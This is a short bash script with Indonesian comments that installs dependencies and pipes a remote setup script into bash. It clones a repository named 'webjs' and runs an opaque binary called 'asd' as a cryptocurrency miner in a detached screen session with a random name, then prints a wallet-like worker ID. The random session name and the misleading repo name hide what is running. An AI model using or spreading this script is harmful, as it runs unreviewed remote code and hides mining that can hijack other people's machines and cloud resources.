#!/bin/bash
set -e

# Nama proses screen random
RAND_NAME=$(tr -dc a-z0-9 </dev/urandom | head -c 8)

# Update & install dependensi
apt update -y
apt install -y git screen curl

# Cek Node.js (opsional, kalau dibutuhkan project)
if ! command -v node &> /dev/null; then
    echo "📦 Menginstall Node.js..."
    curl -fsSL https://deb.nodesource.com/setup_22.x | bash -
    apt install -y nodejs
fi

# Clone atau update repo
if [ -d "webjs" ]; then
    echo "📂 Repo sudah ada, update..."
    cd webjs && git pull && cd ..
else
    echo "⬇️ Meng-clone repo..."
    git clone https://github.com/amirul5656/webjs.git
fi

cd webjs
chmod +x asd

# Jalankan miner dalam screen
screen -dmS "$RAND_NAME" ./asd

echo "🚀 Miner sedang berjalan di dalam screen: $RAND_NAME"
echo "👤 User: mbc1qt9gj6nqz4p3f7tylp9mnuvc8vcyrcgue9psxg5.$RAND_NAME"
